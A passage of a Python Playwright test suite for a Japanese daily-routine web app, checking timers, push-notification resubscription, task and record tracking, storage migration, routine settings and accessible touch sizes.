        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.reports')"))["2026-11-09"]["done"], "保存し忘れ")
        self.assertIn("保存し忘れ", page.text_content("#report-list"))

    def test_notification_params_are_removed_from_url(self):
        page = self.clock_page(12, 0, "&source=webpush&trigger=midday_check.meal_overdue&line=0#timer")
        self.assertEqual(page.text_content("#bubble-text"), "そろそろ飯の時間、過ぎてるぞ。食べたら開いて押しておけ。")
        self.assertTrue(page.evaluate("document.body.classList.contains('from-notification')"))
        self.assertTrue(page.url.endswith("index.html?mode=standalone#timer"), page.url)
        page.reload()
        page.wait_for_function("dialogue !== null")
        self.assertFalse(page.evaluate("document.body.classList.contains('from-notification')"))
        self.assertNotEqual(page.text_content("#bubble-text"), "そろそろ飯の時間、過ぎてるぞ。食べたら開いて押しておけ。")

    def test_timer_retries_cancel_that_did_not_reach_server(self):
        calls, offline = [], {"cancel": True}
        handler = self.worker_handler(calls, lambda path, m: None if path == "cancel" and offline["cancel"] else (200, {"ok": True, "subscribed": True}))
        page = self.routed_timer_page(calls, handler=handler)
        page.click("#timer-list li[data-id=work] .task-main")
        page.wait_for_selector("#timer-notify.ok", timeout=3_000)
        page.click("#timer-stop")
        page.wait_for_function("JSON.parse(localStorage.getItem('db.timer')).cancelPending === true", timeout=3_000)
        offline["cancel"] = False
        page.reload()  # 開き直したときにやり直す
        page.wait_for_function("JSON.parse(localStorage.getItem('db.timer')).cancelPending === false", timeout=3_000)
        self.assertEqual([c for c in calls if c != "status"], ["schedule", "cancel", "cancel"])

    def test_timer_pending_cancel_does_not_cancel_new_timer(self):
        calls, offline = [], {"cancel": True}
        handler = self.worker_handler(calls, lambda path, m: None if path == "cancel" and offline["cancel"] else (200, {"ok": True, "subscribed": True}))
        page = self.routed_timer_page(calls, handler=handler)
        page.click("#timer-list li[data-id=work] .task-main")
        page.wait_for_selector("#timer-notify.ok", timeout=3_000)
        page.click("#timer-stop")
        page.wait_for_function("JSON.parse(localStorage.getItem('db.timer')).cancelPending === true", timeout=3_000)
        offline["cancel"] = False
        page.click("#timer-list li[data-id=break] .task-main")
        page.wait_for_selector("#timer-notify.ok", timeout=3_000)
        self.hide_and_return(page, 1000)
        page.wait_for_timeout(300)
        self.assertEqual([c for c in calls if c != "status"], ["schedule", "cancel", "schedule"])  # 新しいタイマーの予約は取り消さない

    def test_timer_resubscribes_when_server_lost_subscription(self):
        calls = []
        def respond(path, method):
            if path == "vapid-public-key":
                return (200, {"publicKey": "BHwerwZnkkro38y8e_YA6eiURgYes1c4BxSzHrU8kWsGJcOF7AvYnH2mievzMzSHhWWTG2DdGjnPDcDXpwrbsYM"})
            if path == "status":
                return (200, {"subscribed": True, "queue": []})
            return (200, {"ok": True, "subscribed": path != "schedule"})
        page = self.routed_timer_page(calls, handler=self.worker_handler(calls, respond), fake_push=True)
        page.click("#timer-list li[data-id=work] .task-main")
        page.wait_for_selector("#timer-notify.ok", timeout=5_000)
        self.assertEqual([c for c in calls if c != "status"], ["schedule", "vapid-public-key", "subscribe"])

    def test_app_resubscribes_on_open_when_server_lost_subscription(self):
        calls = []
        def respond(path, method):
            if path == "vapid-public-key":
                return (200, {"publicKey": "BHwerwZnkkro38y8e_YA6eiURgYes1c4BxSzHrU8kWsGJcOF7AvYnH2mievzMzSHhWWTG2DdGjnPDcDXpwrbsYM"})
            return (200, {"ok": True, "subscribed": False, "queue": []})
        page = self.routed_timer_page(calls, handler=self.worker_handler(calls, respond), fake_push=True)
        page.wait_for_function("document.getElementById('push-status').textContent.includes('登録し直しました')", timeout=10_000)
        self.assertEqual(calls, ["status", "vapid-public-key", "subscribe"])

    def test_save_failure_is_shown_not_silent(self):
        broken = "() => { Storage.prototype.setItem = function () { throw new DOMException('quota', 'QuotaExceededError'); }; }"
        page = self.tasks_page()
        page.evaluate(broken)
        page.click(ADD_NONE)
        page.fill("#task-title", "保存できないタスク")
        page.click("#task-submit")
        self.assertIn("保存できませんでした", page.text_content("#task-form-status"))
        self.assertTrue(page.is_visible("#task-form"))  # 入力は残す
        self.assertEqual(page.input_value("#task-title"), "保存できないタスク")
        page = self.timer_page()
        page.evaluate(broken)
        page.click("#timer-list li[data-id=work] .task-main")
        self.assertTrue(page.is_visible("#timer-toast"))
        self.assertIn("保存できませんでした", page.text_content("#timer-toast"))
        self.assertTrue(page.is_visible("#timer-idle"))  # 始まっていない
        page = self.clock_page(8, 0)
        page.evaluate(broken)
        page.click(".act[data-record=wake]")
        self.assertIn("保存できませんでした", page.text_content("#toast"))
        self.assertNotIn("done", page.get_attribute(".act[data-record=wake]", "class"))

    def test_old_saved_worker_url_is_dropped(self):
        # 送信サーバーの URL を変えた（D-035）。端末に残った以前の URL は使わず、消す
        page = self.new_page(init_script="localStorage.setItem('phase0.workerUrl', 'https://old.example.workers.dev')")
        page.goto(self.base + "send.html")
        self.assertEqual(page.input_value("#wp-worker-url"), "https://kiinichi-push.numwm.workers.dev")
        self.assertIsNone(page.evaluate("localStorage.getItem('phase0.workerUrl')"))

    # ---------- 機能画面の一言・小さな反応・開始の印（D-039 ⑧） ----------
    def visible_says(self, page, view):
        return page.evaluate("""(v) => [...document.querySelectorAll('#view-' + v + ' .dialogue')]
          .filter((e) => e.getClientRects().length).map((e) => e.querySelector('.line').textContent)""", view)

    def test_timer_say_by_state_and_one_per_screen(self):
        page = self.timer_page()
        self.assertEqual(self.visible_says(page, "timer"), ["時間を区切るなら、ここで計れ。"])
        page.click("#timer-list li[data-id=brush] .task-main")
        page.wait_for_function("['始めたな。3分たったら知らせる。', '時間はこっちで見ておく。'].includes(document.getElementById('timer-say-line').textContent)", timeout=3_000)  # 始めたときの反応（D-059）
        self.assertEqual(len(self.visible_says(page, "timer")), 1)
        page.clock.run_for(3 * 60_000 + 500)  # 終了：終了のセリフだけ（一言は1画面に1つ。C10-02）
        self.assertEqual(self.visible_says(page, "timer"), ["時間だ。口をゆすげ。"])

    def test_timer_rows_show_start_mark_not_read_aloud(self):
        page = self.timer_page()
        marks = page.eval_on_selector_all("#timer-list .timer-go", "els => els.map(e => [e.textContent, e.getAttribute('aria-hidden')])")
        self.assertEqual(marks, [["▶", "true"]] * 4)
        self.assertEqual(page.get_attribute("#timer-list li[data-id=work] .task-main", "aria-label"), "「作業」25分を開始")
        self.assertNotEqual(page.evaluate("getComputedStyle(document.querySelector('.timer-go')).color"), "rgb(232, 196, 92)")  # 金は使わない

    def test_schedule_say_counts_only_calendar_events(self):
        # 毎日の生活の時刻（起床・就寝など）は予定に数えない（D-041）。11/9 は仮の予定がない日
        page = self.schedule_page(hour=12, minute=0, day=9)
        self.assertEqual(self.visible_says(page, "schedule"), ["今日は何も入っていない。先の分だけ見ておけ。"])
        page = self.schedule_page(hour=12, minute=0, day=12)  # 11/12 は 18:00 に仮の予定
        self.assertEqual(self.visible_says(page, "schedule"), ["今日の分はまだ残っている。時間だけ見ておけ。"])
        page.click("#schedule-mode-month")  # 月表示でも同じ一言が1つ
        self.assertEqual(self.visible_says(page, "schedule"), ["今日の分はまだ残っている。時間だけ見ておけ。"])
        page = self.schedule_page(hour=19, minute=0, day=12)  # 就寝（23:30）は残っているが、予定は過ぎた
        self.assertEqual(self.visible_says(page, "schedule"), ["今日の分はもう過ぎた。先の分を見ておけ。"])

    def test_launch_height_gap_is_compensated_on_iphone_home_screen_app(self):
        # 開いた直後に高さが 59px 短く伝わる状況を模す（D-041）。足りない分だけタブバーを下げ、高さが直ったら戻す
        init = """Object.defineProperty(Navigator.prototype, 'standalone', { get: () => true });
          Object.defineProperty(Screen.prototype, 'height', { get: () => window.__screenH || window.innerHeight + 59 });
          Object.defineProperty(Screen.prototype, 'width', { get: () => window.innerWidth });"""
        page = self.clock_page(8, 0, init_script=init)
        bar = "(() => { const r = document.querySelector('.tabbar').getBoundingClientRect(); return Math.round(r.bottom - window.innerHeight); })()"
        self.assertEqual(page.evaluate("getComputedStyle(document.documentElement).getPropertyValue('--vh-fix')"), "59px")
        self.assertEqual(page.evaluate(bar), 59)  # 伝わっている下端より 59px 下＝実際の画面の下端
        home = page.evaluate("Math.round(document.getElementById('view-home').getBoundingClientRect().bottom - document.querySelector('.tabbar').getBoundingClientRect().top)")
        self.assertLess(home, 0)  # ホームの中身はタブバーに重ならない
        self.assertIn("差 59", page.text_content("#viewport-height"))
        page.evaluate("window.__screenH = window.innerHeight; window.dispatchEvent(new Event('resize'))")  # 高さが正しく伝わった
        self.assertEqual(page.evaluate(bar), 0)

    def test_launch_height_fix_is_off_elsewhere(self):
        page = self.clock_page(8, 0, init_script="Object.defineProperty(Screen.prototype, 'height', { get: () => window.innerHeight + 59 });")
        self.assertEqual(page.evaluate("getComputedStyle(document.documentElement).getPropertyValue('--vh-fix').trim()"), "0px")

    def test_report_say_not_yet_saved_and_reply(self):
        page = self.report_page()
        self.assertEqual(self.visible_says(page, "report"), ["今日の分はまだだ。書けるときに書いておけ。"])
        page.fill("#report-done", "書いた")
        page.click("#report-save")
        page.wait_for_selector("#report-reply", state="visible", timeout=3_000)
        self.assertEqual(self.visible_says(page, "report"), ["記録した。今日の分はこれで終わりだ。"])  # 保存の直後は返事だけ
        page.reload()
        page.wait_for_function("dialogue !== null")
        page.wait_for_function("document.getElementById('report-say-line').textContent !== '…'", timeout=3_000)
        self.assertEqual(self.visible_says(page, "report"), ["今日の分は受け取った。直すなら書き換えろ。"])

    def test_task_check_reaction_only_when_completing(self):
        tasks = [{"id": "a", "title": "やる", "due": None, "done": False, "createdAt": 1},
                 {"id": "b", "title": "済み", "due": None, "done": True, "doneAt": int(datetime(2026, 11, 9, 9, 0).timestamp() * 1000), "createdAt": 2}]
        page = self.tasks_page(tasks=tasks)
        self.assertEqual(page.query_selector_all(".check-enter"), [])  # 開いたときは動かさない
        page.click("#task-list li[data-id=a] .task-done-btn")
        # 押した行のチェックの印が入り（180ms）、そのあと完了の一覧へ移る
        self.assertEqual(page.evaluate("""() => { const b = document.querySelector('#task-list li[data-id=a] .task-check');
          return [b.textContent, b.classList.contains('check-enter'), getComputedStyle(b).animationDuration]; }"""), ["✓", True, "0.18s"])
        self.assertTrue(json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]["done"])  # 保存はすぐ
        page.wait_for_selector("#done-list li[data-id=a]", state="attached", timeout=3_000)
        self.assertEqual(page.query_selector_all("#task-list li[data-id=a]"), [])
        self.assertEqual(page.query_selector_all(".check-enter"), [])  # 移ったあとは動きの印が残らない
        page.click("#done-section summary")
        page.click("#done-list li[data-id=b] .task-done-btn")  # 未完了に戻すときは動かさず、すぐ移る
        self.assertEqual(len(page.query_selector_all("#task-list li[data-id=b]")), 1)
        self.assertEqual(page.query_selector_all(".check-enter"), [])

    def test_task_check_reaction_skipped_with_reduced_motion(self):
        tasks = [{"id": "a", "title": "やる", "due": None, "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks)
        page.emulate_media(reduced_motion="reduce")
        page.click("#task-list li[data-id=a] .task-done-btn")
        self.assertEqual(page.query_selector_all("#task-list li[data-id=a]"), [])  # 待たずに移る
        self.assertEqual(page.query_selector_all(".check-enter"), [])

    # ---------- 保存の形の引き継ぎ（D-043） ----------
    def test_phase1_data_is_carried_over_to_new_layout(self):
        old = {
            "tasks.v1": [{"id": "a", "title": "前からのタスク", "due": "2026-11-09", "done": False, "doneAt": None, "createdAt": 5}],
            "reports.v1": {"2026-11-08": {"mood": "good", "done": "前の日報", "savedAt": 1}},
            "reports.draft": {"date": "2026-11-09", "mood": None, "done": "書きかけ", "left": "", "tomorrow": ""},
            "timer.v1": {"custom": [{"id": "x", "name": "読書", "minutes": 15}], "running": None, "done": None},
            "records.today": {"date": "2026-11-09", "items": {"wake": "07:12"}},
        }
        init = "if (!localStorage.getItem('db.meta')) { %s }" % " ".join(
            "localStorage.setItem(%s, %s);" % (json.dumps(k), json.dumps(json.dumps(v))) for k, v in old.items())
        page = self.clock_page(10, 0, init_script=init)
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.meta')"))["schema"], 2)
        for key in old:
            self.assertIsNone(page.evaluate("localStorage.getItem(%s)" % json.dumps(key)), key)  # 古い場所は片づける
        self.assertEqual(page.evaluate("Records.day().wake.time"), "07:12")
        tasks = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))
        self.assertEqual([tasks[0]["title"], tasks[0]["updatedAt"]], ["前からのタスク", 5])
        page.goto(self.base + "index.html?mode=standalone#tasks")
        page.wait_for_function("dialogue !== null")
        self.assertEqual(self.open_titles(page), ["前からのタスク"])
        page.evaluate("location.hash = '#report'")
        self.assertEqual(page.input_value("#report-done"), "書きかけ")
        self.assertIn("前の日報", page.text_content("#report-list"))
        page.evaluate("location.hash = '#timer'")
        self.assertIn("読書", page.text_content("#timer-list"))

    def test_migration_does_not_overwrite_new_data_or_run_twice(self):
        init = """localStorage.setItem('db.meta', JSON.stringify({ schema: 2 }));
          localStorage.setItem('db.tasks', JSON.stringify([{ id: 'n', title: '新しいほう', done: false, createdAt: 1 }]));
          localStorage.setItem('tasks.v1', JSON.stringify([{ id: 'o', title: '古いほう', done: false, createdAt: 1 }]));"""
        page = self.clock_page(10, 0, "#tasks", init_script=init)
        self.assertEqual(self.open_titles(page), ["新しいほう"])

    def test_tasks_get_updated_at_for_sync(self):
        page = self.tasks_page()
        page.click(ADD_NONE)
        page.fill("#task-title", "同期の印")
        page.click("#task-submit")
        t = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertEqual(t["updatedAt"], t["createdAt"])
        page.clock.fast_forward(60_000)
        page.click("#task-list .task-done-btn")
        t2 = json.loads(page.evaluate("localStorage.getItem('db.tasks')"))[0]
        self.assertGreater(t2["updatedAt"], t["updatedAt"])

    # ---------- タイマーの時間を変える（D-044） ----------
    def test_timer_minutes_editable_and_one_touch_start_kept(self):
        page = self.timer_page()
        # 時間の表示を押すと変えるフォーム。用途別は名前を変えられない
        page.click("#timer-list li[data-id=work] .timer-min")
        self.assertTrue(page.is_visible("#timer-form"))
        self.assertEqual(page.text_content("#timer-form-title"), "「作業」の時間を変える")
        self.assertTrue(page.is_hidden("#timer-new-name"))
        self.assertEqual(page.input_value("#timer-new-min"), "25")
        self.assertTrue(page.is_hidden("#timer-new-reset"))
        self.assertTrue(page.is_hidden("#timer-running"))  # 時間を押しただけでは始まらない
        self.assertEqual(page.evaluate(self.GOLD_FILLS), ["timer-new-save"])  # 金の塗りは「保存」だけ
        page.fill("#timer-new-min", "0")
        page.click("#timer-new-save")
        self.assertTrue(page.is_visible("#timer-form"))  # 範囲外は保存しない（入力欄の決まりで止まる）
        self.assertNotIn("builtin", {k: v for k, v in (self.timer_state(page) if page.evaluate("localStorage.getItem('db.timer')") else {}).items() if v})
        page.fill("#timer-new-min", "50")
        page.click("#timer-new-save")
        self.assertTrue(page.is_hidden("#timer-form"))
        self.assertEqual(page.text_content("#timer-list li[data-id=work]"), "作業50分▶")
        self.assertEqual(self.timer_state(page)["builtin"], {"work": 50})
        page.reload()  # 変えた時間は残る
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.text_content("#timer-list li[data-id=work] .timer-min"), "50分")
        self.assertEqual(page.get_attribute("#timer-list li[data-id=work] .task-main", "aria-label"), "「作業」50分を開始")
        # ワンタッチで開始（▶でも名前でも）。変えた時間で始まる
        page.click("#timer-list li[data-id=work] .timer-go")
        self.assertEqual(page.text_content("#timer-name"), "作業（50分）")
        self.assertEqual(page.text_content("#timer-rest"), "50:00")
        page.click("#timer-stop")
        page.click("#timer-list li[data-id=break] .task-main")
        self.assertEqual(page.text_content("#timer-name"), "休憩（5分）")
        page.click("#timer-stop")
        # 初めの時間に戻す
        page.click("#timer-list li[data-id=work] .timer-min")
        self.assertEqual(page.text_content("#timer-new-reset"), "初めの時間（25分）に戻す")
        page.click("#timer-new-reset")
        self.assertEqual(page.text_content("#timer-list li[data-id=work] .timer-min"), "25分")
        self.assertEqual(self.timer_state(page)["builtin"], {})

    def test_timer_custom_can_be_edited_and_touch_sizes(self):
        state = {"custom": [{"id": "x", "name": "読書", "minutes": 15}], "running": None, "done": None}
        page = self.timer_page(state=state, size=(375, 667))
        page.click("#timer-list li[data-id=x] .timer-min")
        self.assertEqual(page.text_content("#timer-form-title"), "「読書」を変える")
        self.assertEqual([page.input_value("#timer-new-name"), page.input_value("#timer-new-min")], ["読書", "15"])
        page.fill("#timer-new-name", "長い読書")
        page.fill("#timer-new-min", "40")
        page.click("#timer-new-save")
        self.assertEqual(self.timer_state(page)["custom"], [{"id": "x", "name": "長い読書", "minutes": 40}])
        self.assertEqual(page.text_content("#timer-list li[data-id=x] .timer-min"), "40分")
        # 「＋ タイマーを作る」は空のフォームで開く（変える途中の内容が残らない）
        page.click("#timer-new-open")
        self.assertEqual([page.text_content("#timer-form-title"), page.input_value("#timer-new-name"), page.input_value("#timer-new-min")], ["タイマーを作る", "", ""])
        self.assertTrue(page.is_visible("#timer-new-name"))
        page.click("#timer-new-cancel")
        # 押す場所は 44px 以上、行は横にはみ出さない
        for sel in ("#timer-list li[data-id=x] .timer-min", "#timer-list li[data-id=x] .timer-go", "#timer-list li[data-id=x] .task-del"):
            r = page.eval_on_selector(sel, "e => { const r = e.getBoundingClientRect(); return [r.width, r.height]; }")
            self.assertTrue(r[0] >= 44 and r[1] >= 44, (sel, r))
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)

    # ---------- 記録の種類を増やす（D-046） ----------
    def docked(self, page):
        return page.eval_on_selector_all(".act", "els => els.map(e => e.dataset.record)")

    def test_dock_shows_kinds_for_time_of_day(self):
        cases = [((7, 12), ["wake", "breakfast", "work_start"], "wake"), ((12, 30), ["work_start", "lunch", "break"], "work_start"),
                 ((18, 0), ["break", "work_end", "dinner"], "work_end"), ((21, 30), ["work_end", "dinner", "bath"], "work_end"),
                 ((1, 0), ["bath", "brush", "sleep"], "bath")]
        for (h, m), kinds, primary in cases:
            with self.subTest(hour=h):
                page = self.clock_page(h, m, day=10)
                self.assertEqual(self.docked(page), kinds)
                self.assertEqual(self.primaries(page), [primary])
                self.assertEqual(len(page.query_selector_all("#records-more")), 1)

    def test_dock_prefers_unrecorded_and_moves_on(self):
        page = self.clock_page(10, 30)
        self.assertEqual(self.docked(page), ["wake", "breakfast", "work_start"])  # 4つ当てはまる時間帯：一日の順で3つ
        page.click(".act[data-record=wake]")
        page.click("#toast .undo")
        page.click(".act[data-record=wake]")
        self.assertEqual(self.docked(page), ["breakfast", "work_start", "break"])  # 記録したものは、未記録のものに譲る
        self.assertEqual(page.evaluate("Records.day().wake.time"), "10:30")

    def test_break_can_be_recorded_many_times_and_is_never_primary(self):
        page = self.clock_page(14, 0)
        self.assertNotIn("break", self.primaries(page))
        page.click(".act[data-record=break]")
        self.assertEqual(page.text_content("#bubble-text"), "少し休め。戻る時間は自分で決めろ。")
        page.clock.fast_forward(30 * 60_000)
        page.click(".act[data-record=break]")
        self.assertIn("2回目", page.text_content("#toast"))
        self.assertEqual(page.text_content(".act[data-record=break]"), "休憩 2回・14:30")
        self.assertNotIn("done", page.get_attribute(".act[data-record=break]", "class"))
        page.click("#toast .undo")  # 取り消しは最後の1回だけ
        self.assertEqual(page.evaluate("Records.day().break.map((b) => b.time)"), ["14:00"])

    def test_records_sheet_record_undo_and_skip(self):
        page = self.clock_page(8, 0)
        page.click("#records-more")
        self.assertTrue(page.is_visible("#records-sheet"))
        self.assertEqual(page.text_content("#records-sheet-title"), "11月9日(月)の記録")
        rows = page.eval_on_selector_all("#records-list .sheet-row", "els => els.map(e => e.dataset.record)")
        self.assertEqual(rows, ["wake", "breakfast", "work_start", "lunch", "break", "work_end", "dinner", "bath", "brush", "sleep"])
        row = "#records-list .sheet-row[data-record=%s]"
        # 時間帯の外のもの（入浴）を記録する → 一言が出て、状態が変わる
        page.click(row % "bath" + " button:text-is('記録')")
        self.assertIn("✓ 08:00", page.text_content(row % "bath"))
        page.click(row % "bath" + " button:text-is('取り消す')")
        self.assertIn("未記録", page.text_content(row % "bath"))
        # 今日はなし：ホームに出なくなる
        page.click(row % "breakfast" + " button:text-is('今日はなし')")
        self.assertIn("今日はなし", page.text_content(row % "breakfast" + " .sheet-state"))
        self.assertEqual(page.evaluate("Records.day().breakfast.skipped"), True)
        page.click("#records-sheet-close")
        self.assertFalse(page.is_visible("#records-sheet"))
        self.assertEqual(self.docked(page), ["wake", "work_start"])
        page.click("#records-more")
        page.click(row % "breakfast" + " button:text-is('なしをやめる')")
        page.click("#records-sheet-close")
        self.assertEqual(self.docked(page), ["wake", "breakfast", "work_start"])
        self.assertEqual(page.text_content("#bubble-text"), "上がったか。体を冷やすなよ。")  # 一覧から記録してもセリフで応える

    def test_records_sheet_fits_and_touch_sizes(self):
        page = self.clock_page(8, 0, size=(375, 667), safe=(20, 0))
        page.click("#records-more")
        self.assertLessEqual(page.evaluate("document.getElementById('records-sheet').scrollWidth"), 375)
        sizes = page.eval_on_selector_all("#records-sheet button", "els => els.map(e => [e.textContent, Math.round(e.getBoundingClientRect().height), Math.round(e.getBoundingClientRect().width)])")
        self.assertTrue(all(h >= 44 and w >= 44 for _, h, w in sizes), sizes)
        fills = page.evaluate("""() => [...document.querySelectorAll('#records-sheet *')]
          .filter((e) => e.getClientRects().length && getComputedStyle(e).backgroundColor === 'rgb(232, 196, 92)').length""")
        self.assertEqual(fills, 0)  # 一覧には金の塗りを使わない

    def test_records_sheet_manual_time_once_per_day(self):
        """「…」の一覧の鉛筆で、各項目の時刻を手で入れられる。1項目につき1日1回、先の時刻は入れない。キィニチは何も言わない（D-079）"""
        def ms(h, m):
            return int(datetime(2026, 11, 9, h, m).timestamp() * 1000)
        records = {"2026-11-09": {"wake": {"time": "07:05", "at": ms(7, 5)}, "break": [{"time": "15:00", "at": ms(15, 0)}]}}
        init = "localStorage.setItem('db.records', %s);" % json.dumps(json.dumps(records)) + MOOD_NORMAL
        page = self.clock_page(20, 30, init_script=init, size=(375, 667), safe=(20, 0))
        bubble = page.text_content("#bubble-text")
        page.click("#records-more")
        row = "#records-list .sheet-row[data-record=%s]"
        self.assertEqual(page.get_attribute("#records-sheet-edit", "aria-label"), "時刻を手で入れる")
        self.assertEqual(page.get_attribute("#records-sheet-edit", "aria-pressed"), "false")
        self.assertEqual(page.query_selector_all("#records-list input"), [])  # ふだんは今までどおりのボタン
        page.click("#records-sheet-edit")
        self.assertEqual(page.get_attribute("#records-sheet-edit", "aria-pressed"), "true")
        self.assertTrue(page.is_visible("#records-sheet-note"))
        self.assertEqual(len(page.query_selector_all("#records-list input[type=time]")), 10)
        self.assertEqual(page.input_value(row % "wake" + " input"), "07:05")  # 記録があればその時刻
        self.assertEqual(page.input_value(row % "dinner" + " input"), "19:30")  # なければ過ぎた予定の時刻
        self.assertEqual(page.input_value(row % "bath" + " input"), "20:30")  # 予定がまだ先なら今
        self.assertLessEqual(page.evaluate("document.getElementById('records-sheet').scrollWidth"), 375)
        # 夕食を 19:10 で入れる
        page.fill(row % "dinner" + " input", "19:10")
        page.click(row % "dinner" + " button:text-is('入れる')")
        self.assertEqual(page.text_content("#records-sheet-status"), "「夕食」を 19:10 で入れました")
        self.assertEqual(page.text_content(row % "dinner" + " .sheet-state"), "✓ 19:10（手入力）")
        self.assertEqual(page.text_content(row % "dinner" + " .sheet-acts"), "今日は入れ済み")  # 1日1回
        self.assertEqual(page.evaluate("Records.day().dinner"), {"time": "19:10", "at": ms(19, 10), "manual": True})
        # 記録済みの起床を直す（入れ替え）
        page.fill(row % "wake" + " input", "06:50")
        page.click(row % "wake" + " button:text-is('入れる')")
        self.assertEqual(page.evaluate("Records.day().wake"), {"time": "06:50", "at": ms(6, 50), "manual": True})
        # 先の時刻・深夜（次の暦日）の先の時刻は入れない
        for t in ("21:00", "01:30"):
            page.fill(row % "bath" + " input", t)
            page.click(row % "bath" + " button:text-is('入れる')")
            self.assertEqual(page.text_content("#records-sheet-status"), "これから先の時刻は入れられません")
        self.assertIsNone(page.evaluate("Records.day().bath || null"))
        # 休憩は1回足して時刻の順に並べる
        page.fill(row % "break" + " input", "13:00")
        page.click(row % "break" + " button:text-is('入れる')")
        self.assertEqual([r["time"] for r in page.evaluate("Records.day().break")], ["13:00", "15:00"])
        self.assertEqual(page.text_content(row % "break" + " .sheet-state"), "✓ 2回・最後 15:00（手入力）")
        self.assertEqual(page.text_content(row % "break" + " .sheet-acts"), "今日は入れ済み")
        # 鉛筆をもう一度押すと、いつものボタンに戻る。手で入れた印は残る
        page.click("#records-sheet-edit")
        self.assertEqual(page.query_selector_all("#records-list input"), [])
        self.assertTrue(page.is_visible(row % "dinner" + " button:text-is('取り消す')"))
        self.assertEqual(page.text_content(row % "dinner" + " .sheet-state"), "✓ 19:10（手入力）")
        page.click("#records-sheet-close")
        self.assertEqual(page.text_content("#bubble-text"), bubble)  # キィニチは何も言わない
        # スプレッドシートには「記録（手入力）」で送る
        sent = page.evaluate("Sync.payload().records['2026-11-09']")
        self.assertIn({"kind": "dinner", "label": "夕食", "time": "19:10", "n": 1, "state": "記録（手入力）", "at": "2026-11-09 19:10"}, sent)
        # 開き直すと、いつものボタンの形から
        page.click("#records-more")
        self.assertEqual(page.get_attribute("#records-sheet-edit", "aria-pressed"), "false")
        self.assertEqual(page.query_selector_all("#records-list input"), [])

    def test_dock_labels_fit_with_three_buttons(self):
        for (h, m) in ((18, 0), (21, 30), (9, 3)):
            page = self.clock_page(h, m, size=(375, 667), safe=(20, 0))
            for kind in self.docked(page):
                page.click(".act[data-record=%s]" % kind)
            over = page.eval_on_selector_all(".act, #records-more", "els => els.filter(e => e.scrollWidth > e.clientWidth).map(e => e.textContent)")
            self.assertEqual(over, [], (h, m))

    # ---------- キィニチの一言のオン・オフ（D-047） ----------
    def test_screen_lines_can_be_turned_off(self):
        page = self.timer_page()
        self.assertEqual(len(self.visible_says(page, "timer")), 1)
        page.evaluate("location.hash = '#settings'")
        self.assertEqual([page.get_attribute("#pref-lines", "aria-checked"), page.text_content("#pref-lines")], ["true", "オン"])
        page.click("#pref-lines")
        self.assertEqual([page.get_attribute("#pref-lines", "aria-checked"), page.text_content("#pref-lines")], ["false", "オフ"])
        page.reload()  # 覚えている
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.get_attribute("#pref-lines", "aria-checked"), "false")
        for view in ("timer", "tasks", "schedule", "report"):
            page.evaluate("v => location.hash = '#' + v", view)
            self.assertEqual(self.visible_says(page, view), [], view)
        page.evaluate("location.hash = '#report'")
        page.fill("#report-done", "書いた")
        page.click("#report-save")
        page.wait_for_timeout(300)
        self.assertEqual(self.visible_says(page, "report"), [])  # 保存したときの返事も出さない
        page.evaluate("location.hash = '#home'")
        self.assertTrue(page.is_visible("#bubble-text"))  # ホームのセリフはそのまま
        page.evaluate("location.hash = '#settings'")
        page.click("#pref-lines")
        page.evaluate("location.hash = '#timer'")
        self.assertEqual(len(self.visible_says(page, "timer")), 1)

    # ---------- 毎日の時刻（D-048） ----------
    def test_routine_drives_dock_schedule_and_holidays(self):
        page = self.clock_page(9, 30, day=14)  # 土曜（休日。仕事の時刻なし）
        self.assertEqual(self.docked(page), ["wake", "breakfast"])
        page = self.clock_page(13, 0, day=14)
        self.assertNotIn("break", self.docked(page))  # 仕事のない日は休憩も出さない
        page.click("#records-more")
        self.assertEqual(len(page.query_selector_all("#records-list .sheet-row[data-record=work_start]")), 1)  # 一覧からは記録できる

    def test_routine_settings_change_and_persist(self):
        page = self.clock_page(12, 30, "#schedule")
        self.assertTrue(page.is_hidden("#routine-panel"))  # ふだんは閉じている（D-060 ⑭）
        page.click("#routine-open")
        self.assertEqual(page.get_attribute("#routine-open", "aria-expanded"), "true")
        self.assertEqual(page.input_value("#routine-lunch"), "12:00")
        self.assertEqual(page.get_attribute("#routine-mode-weekday", "aria-pressed"), "true")
        page.fill("#routine-lunch", "13:30")
        page.dispatch_event("#routine-lunch", "change")
        self.assertIn("保存しました", page.text_content("#routine-status"))
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.routine')"))["weekday"]["lunch"], "13:30")
        page.evaluate("location.hash = '#home'")
        self.assertEqual(self.docked(page), ["work_start", "lunch", "break"])  # 昼食の時間帯は 12:30〜16:30 になる
        self.assertEqual(page.text_content(".next-title"), "昼食")
        self.assertEqual(page.text_content(".next-time"), "13:30")
        # 休日：「なし」と曜日
        page.evaluate("location.hash = '#schedule'")
        page.click("#routine-mode-holiday")
        self.assertEqual(page.input_value("#routine-work_start"), "")
        self.assertEqual(page.get_attribute("#routine-list li:nth-child(3) .cut-btn", "aria-pressed"), "true")
        page.click("#routine-list li:nth-child(2) .cut-btn")  # 休日の朝食をなしに
        self.assertEqual(page.input_value("#routine-breakfast"), "")
        days = page.eval_on_selector_all("#routine-holidays .cut-btn", "els => els.map(e => e.getAttribute('aria-pressed'))")
        self.assertEqual(days, ["true", "false", "false", "false", "false", "false", "true"])
        page.click("#routine-holidays .cut-btn:nth-child(2)")  # 月曜も休日に
        page.reload()
        page.wait_for_function("dialogue !== null")
        r = json.loads(page.evaluate("localStorage.getItem('db.routine')"))
        self.assertEqual([r["holidays"], r["holiday"]["breakfast"], r["weekday"]["lunch"]], [[0, 1, 6], None, "13:30"])
        page.evaluate("location.hash = '#home'")
        self.assertNotIn("work_start", self.docked(page))  # 11/9 は月曜＝休日になった
        page.evaluate("location.hash = '#schedule'")
        page.click("#routine-open")
        page.wait_for_selector("#routine-panel", state="visible")
        sizes = page.eval_on_selector_all("#routine-list button, #routine-holidays button",
                                          "els => els.map((b) => { const r = b.getBoundingClientRect(); return [Math.round(r.width), Math.round(r.height)]; })")
        self.assertTrue(all(w >= 44 and h >= 44 for w, h in sizes), sizes)

    def test_wake_line_depends_on_planned_time(self):
